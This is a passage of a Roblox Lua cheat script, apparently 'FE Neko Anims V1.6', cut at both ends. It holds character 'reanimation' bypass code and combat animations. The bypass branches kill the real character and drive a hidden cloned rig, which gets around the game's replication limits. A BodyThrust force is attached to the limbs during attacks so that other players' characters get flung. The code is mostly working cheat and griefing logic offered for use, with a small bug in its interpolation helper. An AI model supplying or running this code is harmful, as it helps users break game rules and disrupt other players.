			local WDown, ADown, SDown, DDown, SpaceDown = false, false, false, false, false
			local function KEYDOWN(_,Processed) 
				if HumanDied then CONDOWN:Disconnect(); return end
				if Processed ~= true then
					local Key = _.KeyCode
					if Key == Enum.KeyCode.W then
						WDown = true end
					if Key == Enum.KeyCode.A then
						ADown = true end
					if Key == Enum.KeyCode.S then
						SDown = true end
					if Key == Enum.KeyCode.D then
						DDown = true end
					if Key == Enum.KeyCode.Space then
						SpaceDown = true end end end
			CONDOWN = game:GetService("UserInputService").InputBegan:Connect(KEYDOWN)

			local CONUP
			local function KEYUP(_)
				if HumanDied then CONUP:Disconnect(); return end
				local Key = _.KeyCode
				if Key == Enum.KeyCode.W then
					WDown = false end
				if Key == Enum.KeyCode.A then
					ADown = false end
				if Key == Enum.KeyCode.S then
					SDown = false end
				if Key == Enum.KeyCode.D then
					DDown = false end
				if Key == Enum.KeyCode.Space then
					SpaceDown = false end end
			CONUP = game:GetService("UserInputService").InputEnded:Connect(KEYUP)

			local function MoveClone(X,Y,Z)
				LVecPart.CFrame = LVecPart.CFrame * CFrame.new(-X,Y,-Z)
				workspace["non"].Humanoid.WalkToPoint = LVecPart.Position
			end

			coroutine.wrap(function() 
				while true do game:GetService("RunService").RenderStepped:Wait()
					if HumanDied then break end
					if WDown then MoveClone(0,0,1e4) end
					if ADown then MoveClone(1e4,0,0) end
					if SDown then MoveClone(0,0,-1e4) end
					if DDown then MoveClone(-1e4,0,0) end
					if SpaceDown then CloneChar["Humanoid"].Jump = true end
					if WDown ~= true and ADown ~= true and SDown ~= true and DDown ~= true then
						workspace["non"].Humanoid.WalkToPoint = workspace["non"].HumanoidRootPart.Position end
				end 
			end)()

			local con
			function UnCollide()
				if HumanDied then con:Disconnect(); return end
				for _,Parts in next, CloneChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						Parts.CanCollide = false 
					end 
				end
				for _,Parts in next, DeadChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						Parts.CanCollide = false
					end 
				end 
			end
			con = game:GetService("RunService").Stepped:Connect(UnCollide)

			local resetBindable = Instance.new("BindableEvent")
			resetBindable.Event:connect(function()
				game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
				resetBindable:Destroy()
				CloneChar.Humanoid.Health = 0
			end)
			game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)

			coroutine.wrap(function()
				while true do
					game:GetService("RunService").RenderStepped:wait()
					if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChild("Humanoid") or CloneChar:FindFirstChild("Humanoid").Health <= 0 or not DeadChar or not DeadChar:FindFirstChild("Head") or not DeadChar:FindFirstChild("Humanoid") or DeadChar:FindFirstChild("Humanoid").Health <= 0 then 
						HumanDied = true
						pcall(function()
							game.Players.LocalPlayer.Character = CloneChar
							CloneChar:Destroy()
							game.Players.LocalPlayer.Character = DeadChar
							if resetBindable then
								game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
								resetBindable:Destroy()
							end
							DeadChar.Humanoid.Health = 0
						end)
						break
					end		
				end
			end)()

			for _,v in next, DeadChar:GetChildren() do
				if v:IsA("Accessory") then
					v:Clone().Parent = CloneChar
				end
			end

			for _,v in next, DeadChar:GetDescendants() do
				if v:IsA("Motor6D") and v.Name ~= "Neck" then
					v:Destroy()
				end
			end

			SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["UpperTorso"],CloneChar["Torso"],Vector3.new(0,0.2,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LowerTorso"],CloneChar["Torso"],Vector3.new(0,-0.78,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftUpperArm"],CloneChar["Left Arm"],Vector3.new(0,0.375,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftLowerArm"],CloneChar["Left Arm"],Vector3.new(0,-0.215,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftHand"],CloneChar["Left Arm"],Vector3.new(0,-0.825,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightUpperArm"],CloneChar["Right Arm"],Vector3.new(0,0.375,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightLowerArm"],CloneChar["Right Arm"],Vector3.new(0,-0.215,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightHand"],CloneChar["Right Arm"],Vector3.new(0,-0.825,0),Vector3.new(0,0,0))

			SCIFIMOVIELOL(DeadChar["LeftUpperLeg"],CloneChar["Left Leg"],Vector3.new(0,0.575,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftLowerLeg"],CloneChar["Left Leg"],Vector3.new(0,-0.137,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftFoot"],CloneChar["Left Leg"],Vector3.new(0,-0.787,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightUpperLeg"],CloneChar["Right Leg"],Vector3.new(0,0.575,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightLowerLeg"],CloneChar["Right Leg"],Vector3.new(0,-0.137,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightFoot"],CloneChar["Right Leg"],Vector3.new(0,-0.787,0),Vector3.new(0,0,0))

			coroutine.wrap(function()
				while true do
					game:GetService("RunService").RenderStepped:wait()
					if HumanDied then break end
					DeadChar["UpperTorso"].CFrame = CloneChar["Torso"].CFrame * CFrame.new(0,0.2,0)
				end
			end)()

			for _,v in next, DeadChar:GetChildren() do
				if v:IsA("Accessory") then
					SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))
				end
			end

			for _,BodyParts in next, CloneChar:GetDescendants() do
				if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then
					BodyParts.Transparency = 1 end end

		elseif Bypass == "death" then --------------------------------------------------------------------------------------------------------------------
			game:GetService("Players").LocalPlayer["Character"].Archivable = true 
			local CloneChar = game:GetObjects("rbxassetid://5227463276")[1]
			game:GetService("Players").LocalPlayer["Character"].Humanoid.WalkSpeed = 0 
			game:GetService("Players").LocalPlayer["Character"].Humanoid.JumpPower = 0 
			game:GetService("Players").LocalPlayer["Character"].Humanoid.AutoRotate = false
			local FalseChar = Instance.new("Model", workspace); FalseChar.Name = ""
			Instance.new("Part",FalseChar).Name = "Head" 
			Instance.new("Part",FalseChar).Name = "UpperTorso"
			Instance.new("Humanoid",FalseChar).Name = "Humanoid"
			game:GetService("Players").LocalPlayer["Character"] = FalseChar
			game:GetService("Players").LocalPlayer["Character"].Humanoid.Name = "FalseHumanoid"
			local Clone = game:GetService("Players").LocalPlayer["Character"]:FindFirstChild("FalseHumanoid"):Clone()
			Clone.Parent = game:GetService("Players").LocalPlayer["Character"]
			Clone.Name = "Humanoid"
			game:GetService("Players").LocalPlayer["Character"]:FindFirstChild("FalseHumanoid"):Destroy() 
			game:GetService("Players").LocalPlayer["Character"].Humanoid.Health = 0 
			game:GetService("Players").LocalPlayer["Character"] = workspace[game:GetService("Players").LocalPlayer.Name] 
			wait(5.65) 
			game:GetService("Players").LocalPlayer["Character"].Humanoid.Health = 0
			CloneChar.Parent = workspace 
			CloneChar.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer["Character"].HumanoidRootPart.CFrame * CFrame.new(0,0.5,0.1)
			wait() 
			CloneChar.Humanoid.BreakJointsOnDeath = false
			workspace.Camera.CameraSubject = CloneChar.Humanoid 
			CloneChar.Name = "non" 
			CloneChar.Humanoid.DisplayDistanceType = "None"
			if CloneChar.Head:FindFirstChild("face") then CloneChar.Head:FindFirstChild("face"):Destroy() end
			if workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face") then workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face").Parent = CloneChar.Head end

			FalseChar:Destroy()

			local DeadChar = workspace[game:GetService("Players").LocalPlayer.Name]

			local LVecPart = Instance.new("Part", workspace) LVecPart.CanCollide = false LVecPart.Transparency = 1
			local CONVEC
			local function VECTORUNIT()
				if HumanDied then CONVEC:Disconnect(); return end
				local lookVec = workspace.Camera.CFrame.lookVector
				local Root = CloneChar["HumanoidRootPart"]
				LVecPart.Position = Root.Position
				LVecPart.CFrame = CFrame.new(LVecPart.Position, Vector3.new(lookVec.X * 9999, lookVec.Y, lookVec.Z * 9999))
			end
			CONVEC = game:GetService("RunService").Heartbeat:Connect(VECTORUNIT)

			local CONDOWN
			local WDown, ADown, SDown, DDown, SpaceDown = false, false, false, false, false
			local function KEYDOWN(_,Processed) 
				if HumanDied then CONDOWN:Disconnect(); return end
				if Processed ~= true then
					local Key = _.KeyCode
					if Key == Enum.KeyCode.W then
						WDown = true end
					if Key == Enum.KeyCode.A then
						ADown = true end
					if Key == Enum.KeyCode.S then
						SDown = true end
					if Key == Enum.KeyCode.D then
						DDown = true end
					if Key == Enum.KeyCode.Space then
						SpaceDown = true end end end
			CONDOWN = game:GetService("UserInputService").InputBegan:Connect(KEYDOWN)

			local CONUP
			local function KEYUP(_)
				if HumanDied then CONUP:Disconnect(); return end
				local Key = _.KeyCode
				if Key == Enum.KeyCode.W then
					WDown = false end
				if Key == Enum.KeyCode.A then
					ADown = false end
				if Key == Enum.KeyCode.S then
					SDown = false end
				if Key == Enum.KeyCode.D then
					DDown = false end
				if Key == Enum.KeyCode.Space then
					SpaceDown = false end end
			CONUP = game:GetService("UserInputService").InputEnded:Connect(KEYUP)

			local function MoveClone(X,Y,Z)
				LVecPart.CFrame = LVecPart.CFrame * CFrame.new(-X,Y,-Z)
				workspace["non"].Humanoid.WalkToPoint = LVecPart.Position
			end

			coroutine.wrap(function() 
				while true do game:GetService("RunService").RenderStepped:Wait()
					if HumanDied then break end
					if WDown then MoveClone(0,0,1e4) end
					if ADown then MoveClone(1e4,0,0) end
					if SDown then MoveClone(0,0,-1e4) end
					if DDown then MoveClone(-1e4,0,0) end
					if SpaceDown then CloneChar["Humanoid"].Jump = true end
					if WDown ~= true and ADown ~= true and SDown ~= true and DDown ~= true then
						workspace["non"].Humanoid.WalkToPoint = workspace["non"].HumanoidRootPart.Position end
				end 
			end)()

			local con
			function UnCollide()
				if HumanDied then con:Disconnect(); return end
				for _,Parts in next, CloneChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						Parts.CanCollide = false 
					end 
				end
				for _,Parts in next, DeadChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						Parts.CanCollide = false
					end 
				end 
			end
			con = game:GetService("RunService").Stepped:Connect(UnCollide)

			local resetBindable = Instance.new("BindableEvent")
			resetBindable.Event:connect(function()
				game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
				resetBindable:Destroy()
				CloneChar.Humanoid.Health = 0
			end)
			game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)

			coroutine.wrap(function()
				while true do
					game:GetService("RunService").RenderStepped:wait()
					if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChild("Humanoid") or CloneChar:FindFirstChild("Humanoid").Health <= 0 then 
						HumanDied = true
						pcall(function()
							game.Players.LocalPlayer.Character = CloneChar
							CloneChar:Destroy()
							game.Players.LocalPlayer.Character = DeadChar
							if resetBindable then
								game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
								resetBindable:Destroy()
							end
							DeadChar.Humanoid.Health = 0
						end)
						break
					end		
				end
			end)()

			for _,v in next, DeadChar:GetChildren() do
				if v:IsA("Accessory") then
					v:Clone().Parent = CloneChar
				end
			end

			SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["UpperTorso"],CloneChar["Torso"],Vector3.new(0,0.2,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LowerTorso"],CloneChar["Torso"],Vector3.new(0,-0.78,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftUpperArm"],CloneChar["Left Arm"],Vector3.new(0,0.375,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftLowerArm"],CloneChar["Left Arm"],Vector3.new(0,-0.215,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftHand"],CloneChar["Left Arm"],Vector3.new(0,-0.825,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightUpperArm"],CloneChar["Right Arm"],Vector3.new(0,0.375,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightLowerArm"],CloneChar["Right Arm"],Vector3.new(0,-0.215,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightHand"],CloneChar["Right Arm"],Vector3.new(0,-0.825,0),Vector3.new(0,0,0))

			SCIFIMOVIELOL(DeadChar["LeftUpperLeg"],CloneChar["Left Leg"],Vector3.new(0,0.575,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftLowerLeg"],CloneChar["Left Leg"],Vector3.new(0,-0.137,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftFoot"],CloneChar["Left Leg"],Vector3.new(0,-0.787,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightUpperLeg"],CloneChar["Right Leg"],Vector3.new(0,0.575,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightLowerLeg"],CloneChar["Right Leg"],Vector3.new(0,-0.137,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightFoot"],CloneChar["Right Leg"],Vector3.new(0,-0.787,0),Vector3.new(0,0,0))

			SCIFIMOVIELOL(DeadChar["HumanoidRootPart"],CloneChar["HumanoidRootPart"],Vector3.new(0,0,0),Vector3.new(0,0,0))

			for _,v in next, DeadChar:GetChildren() do
				if v:IsA("Accessory") then
					SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))
				end
			end

			for _,BodyParts in next, CloneChar:GetDescendants() do
				if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then
					BodyParts.Transparency = 1 end end
			if DeadChar.Head:FindFirstChild("Neck") then
				game.Players.LocalPlayer.Character:BreakJoints()
			end
		end
	end
	local CloneChar = workspace.non








	local makesound = function(soundid,speed,volume,parent)
		local sound = Instance.new("Sound")
		sound.SoundId = soundid
		sound.RollOffMaxDistance = 100
		sound.PlaybackSpeed =speed 
		sound.Volume = volume
		sound.Parent = parent
		return sound
	end
	local Callerp = function(Start,End,Percent)
		return (Start - (End - Start) * Percen)
	end
	function swait(t)
		game:GetService('RunService').Stepped:wait()
	end

	local TweenService = game:GetService("TweenService")
	local CF = CFrame.new
	local CFA = CFrame.Angles
	local head = CloneChar:WaitForChild("Head")
	local tors = CloneChar:WaitForChild("Torso")
	local huma = CloneChar:WaitForChild("Humanoid")
	huma.DisplayName = " "
	local neck = Instance.new("Weld",tors)
	neck.Part0 = tors
	neck.Part1 = head
	neck.C0 = CF(0,1.5,0)
	local nek = neck.C1
	neck.Enabled = true
	local root = CloneChar.HumanoidRootPart.RootJoint.C0
	local rs = tors["Right Shoulder"].C0
	local ls = tors["Left Shoulder"].C0
	local rh = tors["Right Hip"].C0
	local lh = tors["Left Hip"].C0
	local RootPart = CloneChar:WaitForChild("HumanoidRootPart")
	local Humanoid = CloneChar.Humanoid
	local ActiveTracks = Humanoid:GetPlayingAnimationTracks()
	Humanoid.JumpPower = 80
	local Attacking = false
	local AttackANVal = 1
	local bambam = Instance.new("BodyThrust")
	bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
	bambam.Force = Vector3.new(1000,0,1000)
	bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
	rayCast = function(Pos, Dir, Max, Ignore)

		return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), (CloneChar and game.Players.LocalPlayer.Character))
	end
	Spawn(function()
		for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
			if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
				s = game:GetService("RunService").Heartbeat:connect(function()
					v.Velocity = Vector3.new(0,35,0)
					wait(0.3)
				end)
			end
		end
	end)
	spawn(function()
		repeat
			wait()
		until Humanoid.Health < 0.1
		s:Disconnect()
	end)
	if Tail ~= nil then
		TailWeld = Tail.AccessoryWeld

	else
		TailWeld = Instance.new("Weld",workspace)
		Msgreq("FE Neko Anims V1.6","Loading Without Tail Accessory (Check top of script for the accessory)",5,nil)
	end
	local TC0 = TailWeld.C0 * CFrame.new(0,0,0.4)
	local Song = Instance.new("Sound",RootPart)
	Song.SoundId = SongID
	Song.Looped = true
	Song:Play()
	local Running = false

	local MakeTween = function(timetack,easingstyle,easingdirection,repeats,flipflop)
		local newtween = TweenInfo.new(
			timetack, 
			easingstyle, 
			easingdirection, 
			repeats, 
			flipflop, 
			0 
		)
		return newtween
	end
	local DOTWEEN = function(Part,tim,value)
		local Tween = MakeTween(tim,Enum.EasingStyle.Circular,Enum.EasingDirection.InOut,0,false)
		TweenService:Create(Part,Tween,{C0= value}):Play()
	end
	local LerpStyle = function(lerpmagnet,easingstyle,easingdirection)
		local newstyle = TweenService:GetValue(lerpmagnet,easingstyle,easingdirection)
		return newstyle
	end

	local SpinKick  = function()
		if Attacking == false then
			Attacking = true 
			for i = 0,60,1 do
				swait()
				neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(30),math.rad(0),math.rad(0)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0.0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-20)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(20)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-20 + -10)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-30 - -6)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			end 
			bambam.Location = game.Players.LocalPlayer.Character.Torso.Position
			game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character.Torso.Position
			RootPart.Anchored = true
			for i = 0,60,1 do
				swait()
				RootPart.Position = RootPart.Position + Vector3.new(0,0.6,0)
				bambam.Location = game.Players.LocalPlayer.Character["Right Leg"].Position
				game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character.Torso.Position
				neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(-20 + -36*i),math.rad(0),math.rad(0)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0.0,0,0) * CFA(math.rad(0),math.rad(30),math.rad(40)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(0),math.rad(-30),math.rad(-40)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(50)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(30)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			end 
			RootPart.Anchored = false
			Attacking = false
		end
	end


	local ComboCont = 1
	local Attack = function()
		if Attacking == false then
			Attacking = true
			if ComboCont == 1 then
				for i = 0,10,1 do
					swait()
					bambam.Location = game.Players.LocalPlayer.Character["Right Arm"].Position
					game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character["Right Arm"].Position
					neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(-30),math.rad(0),math.rad(80)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0.5,0,-1.2) * CFA(math.rad(0),math.rad(90),math.rad(90)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(20)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(10)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(30)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				end 

				for i = 0,15,1 do
					swait()
					bambam.Location = game.Players.LocalPlayer.Character["Right Arm"].Position
					game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character["Right Arm"].Position
					neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,-3,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0.5,0,0) * CFA(math.rad(0),math.rad(-85),math.rad(90)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(20)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(40)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(30)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				end
				ComboCont = 2


			elseif ComboCont == 2 then
				for i = 0,10,1 do
					swait()
					bambam.Location = game.Players.LocalPlayer.Character["Left Arm"].Position
					game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character["Left Arm"].Position
					neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(90),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(-30),math.rad(0),math.rad(90)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-12)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-90)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(10)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(30)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				end 

				for i = 0,10,1 do
					swait()
					bambam.Location = game.Players.LocalPlayer.Character["Left Arm"].Position
					game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character["Left Arm"].Position
					neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(-90),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,-3,0) * CFA(math.rad(0),math.rad(0),math.rad(-90)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-12)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0.5) * CFA(math.rad(0),math.rad(90),math.rad(-90)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(10)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(30)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				end 
				ComboCont = 3
			elseif ComboCont == 3 then
				for i = 0,10,1 do
					swait()
					bambam.Location = game.Players.LocalPlayer.Character["Right Leg"].Position
					game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character["Left Arm"].Position
					neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(10),math.rad(0),math.rad(-50)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-5)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(8)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(-50),math.rad(-98)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(20),math.rad(0)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				end 

				for i = 0,15,1 do
					swait()
					bambam.Location = game.Players.LocalPlayer.Character["Right Leg"].Position
					game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character["Left Arm"].Position
					neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(90),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,-3,0) * CFA(math.rad(-40),math.rad(0),math.rad(90)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-5)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
